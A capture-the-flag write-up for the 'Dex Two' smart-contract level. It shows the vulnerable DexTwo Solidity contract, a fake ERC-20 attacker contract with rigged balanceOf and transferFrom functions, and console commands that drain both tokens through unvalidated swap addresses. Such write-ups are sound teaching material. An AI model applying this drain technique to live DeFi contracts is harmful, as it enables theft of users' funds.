# 23. Dex Two

This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract DexTwo  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_amount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_amount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(spender, amount);
    SwappableTokenTwo(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```

## Vulnerability

That one is pretty obvious, the swap function allows any contract to be passed as `from` or `to` parameters. In order to drain the funds from both token1 and token2 we just need to build a simple fake ERC-20 contract that will allow us to withdraw all the funds from the DEX.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {

    address targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    // Fake approve
    function approve(address, uint256 amount) public returns (bool) {
        return true;
    }

    // Fake balanceOf : works as long as you don't try to swap more than 1 unit.
    // Ensures that ((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)))
    // always equal to IERC20(to).balanceOf(address(this)) as long as it is called with amount equal to 1
    // ((1 * IERC20(to).balanceOf(address(this))) / 1 = IERC20(to).balanceOf(address(this)))
    function balanceOf(address account) public returns (uint256) {
        return 1;
    }

    // Fake transferFrom
    function transferFrom(address spender, address receiver, uint256 amount) public returns (bool) {
        return true;
    }
}
```

Just deploy this contract to rinkeby, and use the following commands in the console :

```js
// Ensure that we don't have any approval issues
// on both token1 or token2
await contract.approve(contract.address, 1000);
```

```js
const attackerContractAddress="THE-ADDRESS-OF-THE-ATTACKER-CONTRACT";
```

Now drain the DEX from all of its token1:

```js
// Leave the amount to 1, the attacker contract assumes that this value is set to 1
await contract.swap(attackerContractAddress, token1, 1);
```

And take all of token2 too:

```js
// Leave the amount to 1, the attacker contract assumes that this value is set to 1
await contract.swap(attackerContractAddress, token2, 1);
```

You can now submit the challenge and move to the next one !